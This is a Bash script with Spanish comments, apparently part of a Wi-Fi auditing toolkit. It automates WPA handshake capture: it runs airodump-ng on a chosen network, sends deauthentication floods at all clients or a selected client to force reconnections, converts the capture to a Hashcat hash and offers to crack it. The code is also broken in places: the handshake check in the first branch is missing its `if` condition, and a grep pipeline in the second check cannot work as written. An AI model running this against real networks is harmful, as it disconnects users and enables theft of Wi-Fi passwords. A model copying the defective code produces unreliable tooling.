#!/bin/bash

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Flag global para el trap de limpieza
    export HANDSHAKE_CAPTURED=0
    export full_cap_path=""
    
    # Variables locales
    local bssid=""
    local channel=""
    local default_name=""
    local filename=""
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        # Sanitizar nombre (solo alfanuméricos, guiones y puntos)
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g' | tr -cd '[:alnum:]_.-')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        
        # Validar BSSID
        while true; do
            read -p "Ingresa el BSSID del objetivo (XX:XX:XX:XX:XX:XX): " bssid
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                break
            else
                echo -e "${RED}[!] BSSID inválido. Formato: XX:XX:XX:XX:XX:XX${NC}"
            fi
        done
        
        # Validar Canal
        while true; do
            read -p "Ingresa el CANAL del objetivo (1-14): " channel
            if [[ "$channel" =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 14 ]; then
                break
            else
                echo -e "${RED}[!] Canal inválido. Debe ser un número entre 1 y 14${NC}"
            fi
        done
        
        # Nombre de archivo
        read -p "Ingresa un nombre para el archivo de captura: " filename
        if [ -z "$filename" ]; then 
            filename="handshake_$(date +%s)"
        fi
        # Sanitizar nombre manual también
        filename=$(echo "$filename" | tr -cd '[:alnum:]_.-')
        default_name="$filename"
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    export CURRENT_BSSID="$bssid"
    
    # Limpiar archivos previos con el mismo nombre para asegurar que airodump empiece en -01
    rm -f "${full_cap_path}"*
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    echo -e "${CYAN}[*] Target: $bssid (Canal $channel)${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid" "$bssid" "$full_cap_path"

    
    echo -e "${YELLOW}[*] Esperando 5 segundos para que inicie la captura...${NC}"
    sleep 5
    
    
    while true; do
        clear
        banner
        echo ""
        echo -e "${YELLOW}  CAPTURA DE HANDSHAKE${NC}"
        echo -e "  Target: ${GREEN}$default_name${NC} (${CYAN}$bssid${NC})"
        echo ""
        
        # PRIMERO: Verificar si el proceso de captura sigue activo
        if ! pgrep -f "airodump-ng.*$bssid" > /dev/null; then
            echo -e "  ${CYAN}●${NC} Estado de Captura:"
            echo -e "    ${RED}✗ Inactiva${NC} - La captura se detuvo"
            echo ""
            echo -e "${YELLOW}[!] La captura se detuvo o finalizó.${NC}"
            echo -e "${YELLOW}[*] Verificando resultado...${NC}"
            
            # Buscar archivo de captura
            cap_to_check=""
            if [ -f "${full_cap_path}-01.cap" ]; then
                cap_to_check="${full_cap_path}-01.cap"
            elif [ -f "${full_cap_path}.cap" ]; then
                cap_to_check="${full_cap_path}.cap"
            fi
            
            # Verificar handshake si existe el archivo
            if [ ! -z "$cap_to_check" ] && [ -s "$cap_to_check" ]; then
                # Verificación más robusta
                # Normalizar BSSID a mayúsculas
                target_bssid_upper=$(echo "$bssid" | tr '[:lower:]' '[:upper:]')
                
                # Ejecutar aircrack y capturar salida
                check_output=$(timeout 15 aircrack-ng "$cap_to_check" 2>&1)
                
                # Verificar si contiene handshake para el BSSID objetivo (o en general si solo hay una red)
                    echo -e "${GREEN}[!!!] HANDSHAKE CAPTURADO EXITOSAMENTE${NC}"
                    export HANDSHAKE_CAPTURED=1
                    
                    # 1. Renombrar archivo final (-01.cap -> .cap)
                    # airodump agrega -01, lo renombramos al nombre limpio que quería el usuario
                    final_cap="${full_cap_path}.cap"
                    
                    if [[ "$cap_to_check" != "$final_cap" ]]; then
                        mv "$cap_to_check" "$final_cap"
                        cap_to_check="$final_cap"
                    fi
                    
                    echo -e "${GREEN}[+] Archivo .cap guardado en: $cap_to_check${NC}"

                    # 2. Convertir automáticamente a .hc22000 (Hashcat)
                    hash_file="${full_cap_path}.hc22000"
                    
                    if command -v hcxpcapngtool &> /dev/null; then
                        echo -e "${CYAN}[*] Convirtiendo a formato Hashcat 22000 (.hc22000)...${NC}"
                        hcxpcapngtool -o "$hash_file" "$cap_to_check" >/dev/null 2>&1
                        if [ -f "$hash_file" ]; then
                            echo -e "${GREEN}[+] Archivo Hashcat generado: $(basename "$hash_file")${NC}"
                        else
                            echo -e "${RED}[!] Error al convertir con hcxpcapngtool${NC}"
                        fi
                    else
                        echo -e "${YELLOW}[!] hcxpcapngtool no instalado. Instala 'hcxtools' para auto-conversión.${NC}"
                    fi

                    # 3. Limpieza de archivos auxiliares basura
                    # Borrar los csv, netxml, etc. generados con el patrón "nombre-01.*"
                    rm -f "${full_cap_path}"-*.csv "${full_cap_path}"-*.kismet.csv "${full_cap_path}"-*.kismet.netxml "${full_cap_path}"-*.log.csv 2>/dev/null
                    
                    echo ""
                    
                    # Desactivar trap de limpieza interactiva para evitar prompts al salir
                    trap - SIGINT EXIT
                    
                    # Preguntar crack immediate
                    while true; do
                        read -p "¿Crackear ahora? (S/n): " crack_now
                        crack_now=${crack_now:-S} # Default a S
                        case $crack_now in
                            [sS]* ) crack_password_auto "$cap_to_check" "$bssid"; break ;;
                            [nN]* ) break ;;
                            * ) echo "Por favor responde s o n." ;;
                        esac
                    done
                    break
                else
                    echo -e "${RED}[!] El script no detectó automáticamente el handshake en el archivo.${NC}"
                    echo -e "${YELLOW}[INFO] Sin embargo, el archivo se ha conservado por si acaso.${NC}"
                    echo -e "${CYAN}      Ruta: $cap_to_check${NC}"
                    echo ""
                    echo -e "${YELLOW}Salida de comprobación (Aircrack-ng):${NC}"
                    echo "----------------------------------------"
                    echo "$check_output" | grep -i "WPA" | head -n 5
                    echo "----------------------------------------"
                    
                    read -p "Presiona Enter para volver al menú principal..."
                    return
                fi
            else
                echo -e "${RED}[!] No se encontró archivo de captura válido.${NC}"
                read -p "Presiona Enter para volver al menú principal..."
                return
            fi
        fi
        
        # SEGUNDO: Mostrar estado e indicadores
        echo -e "  ${CYAN}●${NC} Estado de Captura:"
        echo -e "    ${GREEN}✓ Activa${NC} - Monitoreando tráfico..."
        echo ""
        echo -e "  ${CYAN}ℹ${NC}  La ventana externa se cerrará AL DETECTAR el handshake."
        echo -e "     Si no sucede, usa las opciones de abajo:"
        echo ""
        echo -e "  ${CYAN}1${NC}  Deauth masiva (Broadcast)"
        echo -e "  ${CYAN}2${NC}  Deauth específica (Seleccionar cliente)"
        echo -e "  ${CYAN}3${NC}  Detener captura y verificar"
        echo ""
        
        # Read con timeout para refrescar estado cada 10 segundos
        read -t 10 -p "  → Opción: " hs_opt
        exit_code=$?
        
        if [ $exit_code -ne 0 ]; then
            # Timeout alcanzado, loop para refrescar estado (pgrep)
            continue
        fi

        case $hs_opt in
            1)
                echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
                aireplay-ng -0 10 -a "$bssid" "$mon_interface"
                sleep 2
                ;;
            2)
                # Parsear clientes desde el CSV que está generando airodump en segundo plano
                csv_file="${full_cap_path}-01.csv"
                if [ ! -f "$csv_file" ]; then
                    echo -e "${RED}[!] Aún no hay datos de clientes. Espera un momento.${NC}"
                else
                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
                    local count=0
                    local -a client_macs
                    
                    # Leer CSV ignorando la primera sección (APs) y buscando la sección Station MAC
                    in_stations=0
                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
                        col1=$(echo "$col1" | tr -d '[:space:]')
                        if [[ "$col1" == "StationMAC" ]]; then in_stations=1; continue; fi
                        
                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                             # Ignorar si el cliente es el propio BSSID (a veces pasa en modo monitor)
                             if [[ "$col1" != "$bssid" ]]; then
                                 count=$((count+1))
                                 client_macs[$count]="$col1"
                                 power=$(echo "$col4" | tr -d '[:space:]')
                                 packets=$(echo "$col6" | tr -d '[:space:]')
                                 echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
                             fi
                        fi
                    done < "$csv_file"
                    
                    if [ "$count" -eq 0 ]; then
                        echo -e "${RED}[!] No se han detectado clientes activos aún.${NC}"
                    else
                        echo ""
                        read -p "Cliente a atacar (número): " c_sel
                        # Validar que sea un número
                        if [[ "$c_sel" =~ ^[0-9]+$ ]] && [[ "$c_sel" -gt 0 ]] && [[ "$c_sel" -le "$count" ]]; then
                            target_client="${client_macs[$c_sel]}"
                            echo -e "${RED}[ATTACK] Enviando 10 paquetes a $target_client...${NC}"
                            aireplay-ng -0 10 -a "$bssid" -c "$target_client" "$mon_interface"
                        else
                            echo -e "${RED}[!] Selección inválida. Debe ser un número entre 1 y $count${NC}"
                        fi
                    fi
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                echo -e "${YELLOW}[*] Deteniendo captura y procesando archivos...${NC}"
                
                # Matar procesos de captura
                pkill -f "airodump-ng.*$bssid"
                killall airodump-ng 2>/dev/null
                
                # 1. Encontrar el archivo .cap más reciente
                cap_path_base="${full_cap_path}"
                # Si full_cap_path ya tiene extensión .cap, quitarla para buscar base
                if [[ "$cap_path_base" == *.cap ]]; then
                    cap_path_base="${cap_path_base%.*}"
                fi
                
                # Buscar el archivo más reciente que coincida con el patrón base
                # Esto maneja casos como -01.cap, -02.cap, etc.
                cap_to_check=$(ls -t "${cap_path_base}"*.cap 2>/dev/null | head -n 1)
                
                if [ -z "$cap_to_check" ]; then
                    echo -e "${RED}[!] No se encontró ningún archivo de captura .cap${NC}"
                    return
                fi
                
                # 2. Verificar handshake con método robusto
                echo -e "${CYAN}[*] Analizando archivo: $(basename "$cap_to_check")...${NC}"
                
                # Sincronizar y copiar para evitar errores de lectura
                sync
                cp -f "$cap_to_check" "/tmp/check_handshake_$$.cap" 2>/dev/null
                
                has_handshake=0
                target_bssid_upper=$(echo "$bssid" | tr '[:lower:]' '[:upper:]')
                
                # Ejecutar aircrack-ng sobre copia temporal
                aircrack_output=$(aircrack-ng "/tmp/check_handshake_$$.cap" 2>&1)
                rm -f "/tmp/check_handshake_$$.cap"
                
                # Buscar si nuestro BSSID tiene handshake
                if echo "$aircrack_output" | grep -F "$target_bssid_upper" | grep -qi "handshake" | grep -qv "0 handshake"; then
                    has_handshake=1
                fi
                
                # 3. Procesar resultados
                if [ "$has_handshake" -eq 1 ]; then
                    echo -e "${GREEN}[+] ¡Handshake VÁLIDO confirmado!${NC}"
                    
                    # Desactivar trap de limpieza interactiva
                    trap - SIGINT EXIT
                    
                    # Nombre final deseado (ej: Solaris.cap)
                    final_cap_name="${cap_path_base}.cap"
                    
                    # Renombrar si es necesario (ej: de Solaris-01.cap a Solaris.cap)
                    if [ "$cap_to_check" != "$final_cap_name" ]; then
                        echo -e "${CYAN}[*] Renombrando a: $(basename "$final_cap_name")${NC}"
                        mv "$cap_to_check" "$final_cap_name"
                        cap_to_check="$final_cap_name"
                    fi
                    
                    # Conversión a hccapx/22000
                    hash_file="${cap_path_base}.hc22000"
                    
                    if command -v hcxpcapngtool &> /dev/null; then
                        echo -e "${CYAN}[*] Convirtiendo a formato Hashcat 22000 (hcxpcapngtool)...${NC}"
                        hcxpcapngtool -o "$hash_file" "$cap_to_check" >/dev/null 2>&1
                        if [ -f "$hash_file" ]; then
                            echo -e "${GREEN}[+] Hash guardado en: $(basename "$hash_file")${NC}"
                        else
                            echo -e "${RED}[!] Error al convertir con hcxpcapngtool${NC}"
                        fi
                    else
                        echo -e "${YELLOW}[!] hcxpcapngtool no instalado. No se pudo convertir a hash.${NC}"
                        echo -e "${YELLOW}[*] Instala 'hcxtools' para esta función: sudo apt install hcxtools${NC}"
                    fi
                    
                    # Limpieza segura de archivos auxiliares
                    echo -e "${CYAN}[*] Limpiando archivos temporales innecesarios...${NC}"
                    rm -f "${cap_path_base}"-*.csv "${cap_path_base}"-*.kismet.csv "${cap_path_base}"-*.kismet.netxml "${cap_path_base}"-*.log.csv 2>/dev/null
                    # Borrar también los .cap antiguos (-01, -02) si ya renombramos el bueno
                    if [ "$cap_to_check" == "$final_cap_name" ]; then
                        rm -f "${cap_path_base}"-*.cap 2>/dev/null
                    fi
                    
                    echo -e "${GREEN}[SUCCESS] Captura completada y guardada en $(dirname "$final_cap_name")${NC}"
                    export HANDSHAKE_CAPTURED=1
                    
                else
                    echo -e "${RED}[!] No se detectó handshake en el archivo.${NC}"
                    echo -e "${YELLOW}Análisis de aircrack-ng:${NC}"
                    echo "----------------------------------------"
                    echo "$aircrack_output" | grep -F "$target_bssid_upper" -A 2
                    echo "----------------------------------------"
                    
                    read -p "¿Deseas conservar el archivo de captura de todas formas? (s/N): " keep
                    if [[ "$keep" =~ ^[sS]$ ]]; then
                        echo -e "${GREEN}[+] Archivo conservado en: $cap_to_check${NC}"
                    else
                        echo -e "${YELLOW}[*] Eliminando captura fallida...${NC}"
                        rm -f "${cap_path_base}"* 2>/dev/null
                    fi
                fi
                
                return
                ;;
            "" ) ;; # Ignorar enter vacío (refrescar)
            *) echo "Opción inválida." ;;
        esac
    done
}
